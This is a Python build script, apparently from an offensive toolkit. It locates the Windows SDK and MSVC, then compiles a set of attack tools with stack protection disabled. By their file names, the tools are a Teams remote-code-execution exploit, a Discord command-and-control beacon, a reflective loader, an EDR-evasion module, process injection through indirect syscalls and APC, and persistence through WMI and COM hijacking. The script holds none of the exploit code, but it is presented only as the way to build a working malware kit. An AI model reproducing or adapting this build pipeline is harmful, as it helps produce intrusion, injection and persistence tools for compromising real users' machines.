import os
import subprocess
import sys

print("[*] Fox's Aggressive Build Script")
print("[*] Hunting down your broken Windows SDK...")

def find_file(filename, search_paths):
    for path in search_paths:
        if not os.path.exists(path):
            continue
        for root, dirs, files in os.walk(path):
            if filename in files:
                return root
    return None

search_dirs = [
    r"C:\Program Files (x86)\Windows Kits\10\Include",
    r"C:\Program Files (x86)\Windows Kits\8.1\Include",
    r"C:\Program Files\Microsoft SDKs\Windows"
]

lib_search_dirs = [
    r"C:\Program Files (x86)\Windows Kits\10\Lib",
    r"C:\Program Files (x86)\Windows Kits\8.1\Lib",
    r"C:\Program Files\Microsoft SDKs\Windows"
]

msvc_search_dirs = [
    r"C:\Program Files (x86)\Microsoft Visual Studio",
    r"C:\Program Files\Microsoft Visual Studio"
]

windows_h_dir = find_file("windows.h", search_dirs)
if not windows_h_dir:
    print("[-] CRITICAL ERROR: windows.h not found anywhere on your system.")
    print("[-] You do not have the Windows SDK installed. You literally cannot compile C++ for Windows without it.")
    sys.exit(1)

# Get the base include directory (e.g., ...\10.0.22621.0)
base_inc_dir = os.path.dirname(windows_h_dir)
print(f"[+] Found Windows SDK Includes at: {base_inc_dir}")

# Find kernel32.lib
kernel32_dir = find_file("kernel32.lib", lib_search_dirs)
if not kernel32_dir:
    print("[-] CRITICAL ERROR: kernel32.lib not found.")
    sys.exit(1)

# Get the base lib directory (e.g., ...\10.0.22621.0)
# kernel32_dir is likely something like ...\um\x64
base_lib_dir = os.path.dirname(os.path.dirname(kernel32_dir))
print(f"[+] Found Windows SDK Libs at: {base_lib_dir}")

# Find stdio.h (MSVC includes)
stdio_h_dir = find_file("stdio.h", msvc_search_dirs)
if not stdio_h_dir:
    print("[-] CRITICAL ERROR: stdio.h not found. MSVC is missing.")
    sys.exit(1)
print(f"[+] Found MSVC Includes at: {stdio_h_dir}")

# Find MSVC libs (vcruntime.lib)
vcruntime_dir = find_file("vcruntime.lib", msvc_search_dirs)
if not vcruntime_dir:
    print("[-] CRITICAL ERROR: vcruntime.lib not found.")
    sys.exit(1)
print(f"[+] Found MSVC Libs at: {vcruntime_dir}")

# Construct include and lib strings
includes = f'/I"{stdio_h_dir}" /I"{base_inc_dir}\\um" /I"{base_inc_dir}\\shared" /I"{base_inc_dir}\\ucrt"'
libs = f'/LIBPATH:"{vcruntime_dir}" /LIBPATH:"{base_lib_dir}\\um\\x64" /LIBPATH:"{base_lib_dir}\\ucrt\\x64"'

if not os.path.exists("bin"):
    os.makedirs("bin")

def compile_file(src, out, subsystem="CONSOLE"):
    print(f"[*] Compiling {out}...")
    cmd = f'cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG {includes} /Tc {src} /link {libs} /OUT:bin\\{out} /SUBSYSTEM:{subsystem} /MACHINE:x64'
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"[+] Successfully compiled {out}")
    except subprocess.CalledProcessError:
        print(f"[-] Failed to compile {out}")

compile_file("cve_2025_23198_teams_rce.cpp", "teams_rce.exe")
compile_file("discord_c2_v2\\main_beacon_v2.cpp /Tc discord_c2_v2\\sleep_ekko.cpp", "beacon_v2.exe", "WINDOWS")
compile_file("discord_c2_v2\\reflective_loader.cpp", "loader.exe", "WINDOWS")
compile_file("discord_c2_v2\\evasion_native.cpp", "evasion.exe")
compile_file("discord_c2_v2\\injection_indirect_syscalls.cpp", "syscalls.exe")
compile_file("discord_c2_v2\\injection_apc.cpp", "apc_inject.exe")
compile_file("discord_c2_v2\\persistence_wmi.cpp", "persist_wmi.exe")
compile_file("discord_c2_v2\\persistence_com_hijack.cpp", "persist_com.exe")

print("[*] Done. Check the 'bin' folder.")
